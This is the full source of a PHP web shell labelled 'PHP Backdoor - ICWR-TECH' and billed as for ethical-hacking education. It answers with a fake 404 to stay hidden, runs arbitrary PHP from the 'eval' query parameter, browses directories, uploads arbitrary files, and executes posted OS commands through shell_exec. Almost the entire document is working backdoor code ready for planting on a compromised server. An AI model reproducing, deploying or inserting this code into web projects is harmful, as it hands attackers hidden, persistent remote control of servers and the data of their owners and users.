<?php
//--------------------------------//
// PHP Backdoor - ICWR-TECH       //
// For Education Ethical Hacking  //
//--------------------------------//

//----- Config Backdoor -----//
error_reporting(0);
header('HTTP/1.0 404 Not Found', true, 404);
if($_GET['eval']) {
echo eval($_GET['eval']);
exit;
}
$path_false = getcwd();
$path_get = $_GET['path'];
if($_GET['path']) {
  $path = $path_get;
} else {
  $path = $path_false;
}
chdir($path);
$path = str_replace('\\','/',$path);
$expld = explode('/',$path);

foreach($expld as $id=>$pat){
if($pat == '' && $id == 0){
$a = true;
$pathout = '<a href="?path=/">/</a>';
continue;
}
if($pat == '') continue;
$pathout .= '<a href="?path=';
for($i=0;$i<=$id;$i++){
$pathout .= "$expld[$i]";
if($i != $id) $pathout .= "/";
}
$pathout .= '">'.$pat.'</a>/';
}
//---------------------------//
?>
<title>PHP Backdoor - ICWR-TECH</title>
<meta name="description" content="Simple & Efficient For PHP Backdoor">
<link rel="icon" href="https://icwr-tech.id/logo.png">
<style>
    html {
      background: black;
      color: white;
    }
    a {
      text-decoration: none;
      color: white;
    }
    .box {
      background: transparent;
      color: white;
      border: 1px solid white;
      padding: 10px;
    }
    .boxleft {
      background: transparent;
      color: white;
      border: 1px solid white;
      padding: 10px;
      text-align: left;
    }
    input[type="text"] {
      background: transparent;
      color: white;
      border: none;
      border-bottom: 1px solid white;
    }
    input[type="submit"] {
      background: transparent;
      color: white;
      corder: 1px solid white;
    }
    textarea {
      background: transparent;
      color: white;
      border: 1px solid white;
      width: 100%;
      height: 200px;
    }
</style>
<center>
<div class="box">
  <h1>PHP Backdoor - ICWR-TECH</h1>
  Simple & Efficient For PHP Backdoor
  <br><br>
</div>
  <div class="box">
  File Uploader
  <br><br>
  <form enctype="multipart/form-data" method="post">
    <input type="file" name="up">
    <input type="submit" value="Upload!">
  </form>
<?php if(isset($_FILES['up'])) { if(copy($_FILES['up']['tmp_name'],"$path/".$_FILES['up']['name'])) { echo "Upload Success!"; } else { echo "Failed To Upload"; }} ?>
</div>
<div class="box">
[ <a href="?">Home</a> ]
</div>
<?php $id = get_current_user(); $shell = $id."@".gethostname().":~ ".$pathout." $ "; ?>
<div class="boxleft">
Function shell_exec() => <?php echo (shell_exec('dir')) ? "ON" : "OFF"; ?>
<br><br>
<?php $temp = $id."@".gethostname().":~ ".$path." $ ".$_POST['shell']; ?>
<textarea readonly>
<?php if(isset($_POST['shell'])) { if($exe = shell_exec($_POST['shell'])) { echo $temp."\n\n".$exe; } else { echo "Command Not Found or Disable"; } } ?>
</textarea>
<br><br>
<form enctype="multipart/form-data" method="post">
  <?php echo $shell;?> <input type="text" name="shell">
  <input type="submit" value="Execute!">
</form>
</div>
<div class="box">
  Copyright &copy;2019 - ICWR-TECH
</div>
